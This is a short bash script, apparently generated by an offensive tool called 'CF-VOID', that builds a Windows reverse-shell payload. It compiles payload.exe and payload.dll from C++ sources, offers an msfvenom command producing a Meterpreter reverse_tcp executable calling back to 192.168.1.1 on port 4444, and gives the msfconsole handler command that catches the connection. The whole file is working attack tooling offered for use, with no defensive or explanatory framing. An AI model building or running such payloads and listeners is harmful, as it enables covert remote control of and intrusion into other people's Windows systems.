#!/bin/bash
# CF-VOID Windows Payload Build Script
# Name: payload
# LHOST: 192.168.1.1 LPORT: 4444 Arch: x64

# Build EXE (requires mingw-w64 or MSVC)
g++ -o payload.exe main.cpp -lws2_32 -static

# Build DLL (requires mingw-w64)
g++ -shared -o payload.dll dllmain.cpp -lws2_32

# Build with msfvenom (alternative)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o payload.exe

# Listener command
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.1; set LPORT 4444; exploit"
